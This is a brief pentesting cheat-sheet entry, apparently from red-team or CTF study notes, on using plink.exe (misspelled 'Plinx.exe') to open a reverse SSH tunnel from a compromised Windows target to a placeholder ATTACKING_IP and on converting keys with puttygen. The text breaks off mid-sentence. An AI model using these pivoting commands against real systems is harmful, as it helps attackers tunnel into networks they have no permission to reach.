# Plinx.exe

`Now that Windows comes with its **own inbuilt SSH client**, plink is less useful for modern servers; however, it is still a very useful tool, so we will cover it here.`

### Reverse Connection

```
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```

### Windows Servers

```
"Note !!"
# Keys generated by ssh-keygen will not work properly here.

# Convert them using the "puttygen" tool :
sudo apt install putty-tools

# Conversion can be done with :
puttygen KEYFILE -o OUTPUT_KEY.ppk

# The resulting .ppk file can then be transferred to the Windows target

# Download a new copy of plinx.exe from
